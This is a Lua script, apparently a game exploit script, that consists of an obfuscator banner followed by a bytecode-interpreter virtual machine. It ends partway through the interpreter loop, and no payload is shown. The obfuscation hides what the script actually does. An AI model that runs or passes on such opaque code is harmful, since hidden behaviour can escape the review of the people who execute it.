--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_stop looking here (v7.8) ~  lollypop5ever 

]]--⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⣁⣀⣀⣈⣉⠙⠻⢿⣿⣿⣿⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⠾⠛⠉⠁⠀⠉⠙⠻⣦⣄⠙⢿⣿⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣠⡿⠁⠀⣠⣴⠶⠶⢶⣤⡀⠀⠻⣦⠈⢿⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢠⡿⠀⢀⣾⠋⠀⣀⣀⠀⠉⢿⣄⠀⠸⡇⠸⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⡇⠀⢸⡇⠀⢸⣿⠙⣷⡀⠀⣿⡄⠀⣿⠀⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠘⣷⠀⠈⢿⣄⠀⠀⢀⡿⠁⠀⣿⠃⠀⣿⢰⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠹⣧⡀⠀⠙⠛⠟⠛⠁⢀⣴⠏⠀⢠⣧⣿⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⣦⡈⠻⢶⣤⣀⣀⣤⣴⠟⠋⠀⣠⣿⣿⣿⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⣠⣿⣿⣶⣤⣬⣉⣉⣉⣀⣠⣤⣾⣿⣿⣿⣿⣿⣿
-- ⣿⣿⣿⣿⣿⣿⡿⠋⠀⣠⣾⣿⣿⣿⣿skript⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-- ⣿⣿⣿⣿⣿⠟⠀⣠⣾⣿⣿by lulaslollipop⣿⣿⣿⣿⣿
-- ⣿⣿⣿⠟⠁⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-- ⣿⣿⠃⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-- ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
  return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
  local DIP = 1;
  local repeatNext;
  ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
    if (Byte(byte, 2) == 79) then
      repeatNext = StrToNumber(Sub(byte, 1, 1));
      return "";
    else
      local a = Char(StrToNumber(byte, 16));
      if repeatNext then
        local b = Rep(a, repeatNext);
        repeatNext = nil;
        return b;
      else
        return a;
      end
    end
  end);
  local function gBit(Bit, Start, End)
    if End then
      local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
      return Res - (Res % 1);
    else
      local Plc = 2 ^ (Start - 1);
      return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
    end
  end
  local function gBits8()
    local a = Byte(ByteString, DIP, DIP);
    DIP = DIP + 1;
    return a;
  end
  local function gBits16()
    local a, b = Byte(ByteString, DIP, DIP + 2);
    DIP = DIP + 2;
    return (b * 256) + a;
  end
  local function gBits32()
    local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
    DIP = DIP + 4;
    return (d * 16777216) + (c * 65536) + (b * 256) + a;
  end
  local function gFloat()
    local Left = gBits32();
    local Right = gBits32();
    local IsNormal = 1;
    local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
    local Exponent = gBit(Right, 21, 31);
    local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
    if (Exponent == 0) then
      if (Mantissa == 0) then
        return Sign * 0;
      else
        Exponent = 1;
        IsNormal = 0;
      end
    elseif (Exponent == 2047) then
      return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
    end
    return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
  end
  local function gString(Len)
    local Str;
    if not Len then
      Len = gBits32();
      if (Len == 0) then
        return "";
      end
    end
    Str = Sub(ByteString, DIP, (DIP + Len) - 1);
    DIP = DIP + Len;
    local FStr = {};
    for Idx = 1, #Str do
      FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
    end
    return Concat(FStr);
  end
  local gInt = gBits32;
  local function _R(...)
    return {...}, Select("#", ...);
  end
  local function Deserialize()
    local Instrs = {};
    local Functions = {};
    local Lines = {};
    local Chunk = {Instrs,Functions,nil,Lines};
    local ConstCount = gBits32();
    local Consts = {};
    for Idx = 1, ConstCount do
      local Type = gBits8();
      local Cons;
      if (Type == 1) then
        Cons = gBits8() ~= 0;
      elseif (Type == 2) then
        Cons = gFloat();
      elseif (Type == 3) then
        Cons = gString();
      end
      Consts[Idx] = Cons;
    end
    Chunk[3] = gBits8();
    for Idx = 1, gBits32() do
      local Descriptor = gBits8();
      if (gBit(Descriptor, 1, 1) == 0) then
        local Type = gBit(Descriptor, 2, 3);
        local Mask = gBit(Descriptor, 4, 6);
        local Inst = {gBits16(),gBits16(),nil,nil};
        if (Type == 0) then
          Inst[3] = gBits16();
          Inst[4] = gBits16();
        elseif (Type == 1) then
          Inst[3] = gBits32();
        elseif (Type == 2) then
          Inst[3] = gBits32() - (2 ^ 16);
        elseif (Type == 3) then
          Inst[3] = gBits32() - (2 ^ 16);
          Inst[4] = gBits16();
        end
        if (gBit(Mask, 1, 1) == 1) then
          Inst[2] = Consts[Inst[2]];
        end
        if (gBit(Mask, 2, 2) == 1) then
          Inst[3] = Consts[Inst[3]];
        end
        if (gBit(Mask, 3, 3) == 1) then
          Inst[4] = Consts[Inst[4]];
        end
        Instrs[Idx] = Inst;
      end
    end
    for Idx = 1, gBits32() do
      Functions[Idx - 1] = Deserialize();
    end
    return Chunk;
  end
  local function Wrap(Chunk, Upvalues, Env)
    local Instr = Chunk[1];
    local Proto = Chunk[2];
    local Params = Chunk[3];
    return function(...)
      local Instr = Instr;
      local Proto = Proto;
      local Params = Params;
      local _R = _R;
      local VIP = 1;
      local Top = -1;
      local Vararg = {};
      local Args = {...};
      local PCount = Select("#", ...) - 1;
      local Lupvals = {};
      local Stk = {};
      for Idx = 0, PCount do
        if (Idx >= Params) then
          Vararg[Idx - Params] = Args[Idx + 1];
        else
          Stk[Idx] = Args[Idx + 1];
        end
      end
      local Varargsz = (PCount - Params) + 1;
      local Inst;
      local Enum;
      while true do
        Inst = Instr[VIP];
        Enum = Inst[1];
        if (Enum <= 199) then
          if (Enum <= 99) then
            if (Enum <= 49) then
              if (Enum <= 24) then
                if (Enum <= 11) then
                  if (Enum <= 5) then
                    if (Enum <= 2) then
                      if (Enum <= 0) then
                        local B;
                        local A;
                        if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                          Stk[Inst[2]] = Env;
                        else
                          Stk[Inst[2]] = Env[Inst[3]];
                        end
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                          Stk[Inst[2]] = Env;
                        else
                          Stk[Inst[2]] = Env[Inst[3]];
                        end
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        A = Inst[2];
                        B = Stk[Inst[3]];
                        Stk[A + 1] = B;
                        Stk[A] = B[Inst[4]];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3];
                      elseif (Enum > 1) then
                        if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                          Stk[Inst[2]] = Env;
                        else
                          Stk[Inst[2]] = Env[Inst[3]];
                        end
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        do
                          return;
                        end
                      else
                        local Edx;
                        local Results, Limit;
                        local B;
                        local A;
                        if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                          Stk[Inst[2]] = Env;
                        else
                          Stk[Inst[2]] = Env[Inst[3]];
                        end
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                          Stk[Inst[2]] = Env;
                        else
                          Stk[Inst[2]] = Env[Inst[3]];
                        end
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        A = Inst[2];
                        B = Stk[Inst[3]];
                        Stk[A + 1] = B;
                        Stk[A] = B[Inst[4]];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3];
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]] = Inst[3] ~= 0;
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        A = Inst[2];
                        Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                        Top = (Limit + A) - 1;
                        Edx = 0;
                        for Idx = A, Top do
                          Edx = Edx + 1;
                          Stk[Idx] = Results[Edx];
                        end
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        A = Inst[2];
                        Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        Stk[Inst[2]]();
                        VIP = VIP + 1;
                        Inst = Instr[VIP];
                        do
                          return;
                        end
                      end
                    elseif (Enum <= 3) then
                      local B;
                      local A;
                      A = Inst[2];
                      Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                    elseif (Enum == 4) then
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3] ~= 0;
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]]();
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    else
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]]();
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    end
                  elseif (Enum <= 8) then
                    if (Enum <= 6) then
                      local B;
                      local A;
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if Stk[Inst[2]] then
                        VIP = VIP + 1;
                      else
                        VIP = Inst[3];
                      end
                    elseif (Enum == 7) then
                      local Edx;
                      local Results, Limit;
                      local B;
                      local A;
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3] ~= 0;
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                      Top = (Limit + A) - 1;
                      Edx = 0;
                      for Idx = A, Top do
                        Edx = Edx + 1;
                        Stk[Idx] = Results[Edx];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]]();
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      do
                        return;
                      end
                    else
                      local B;
                      local A;
                      Env[Inst[3]] = Stk[Inst[2]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A](Unpack(Stk, A + 1, Inst[3]));
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      B = Stk[Inst[3]];
                      Stk[A + 1] = B;
                      Stk[A] = B[Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Inst[3];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      A = Inst[2];
                      Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
                    end
                  elseif (Enum <= 9) then
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if (Stk[Inst[2]] == Stk[Inst[4]]) then
                      VIP = VIP + 1;
                    else
                      VIP = Inst[3];
                    end
                  elseif (Enum > 10) then
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]][Inst[3]] = Inst[4];
                  else
                    local Edx;
                    local Results, Limit;
                    local B;
                    local A;
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                      Stk[Inst[2]] = Env;
                    else
                      Stk[Inst[2]] = Env[Inst[3]];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    B = Stk[Inst[3]];
                    Stk[A + 1] = B;
                    Stk[A] = B[Inst[4]];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]] = Inst[3];
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
                    Top = (Limit + A) - 1;
                    Edx = 0;
                    for Idx = A, Top do
                      Edx = Edx + 1;
                      Stk[Idx] = Results[Edx];
                    end
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    A = Inst[2];
                    Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    Stk[Inst[2]]();
                    VIP = VIP + 1;
                    Inst = Instr[VIP];
                    do
                      return;
                    end
                  end
                elseif (Enum <= 17) then
                  if (Enum <= 14) then
                    if (Enum <= 12) then
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                        Stk[Inst[2]] = Env;
                      else
                        Stk[Inst[2]] = Env[Inst[3]];
                      end
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
                      Stk[Inst[2]][Inst[3]] = Inst[4];
                      VIP = VIP + 1;
                      Inst = Instr[VIP];
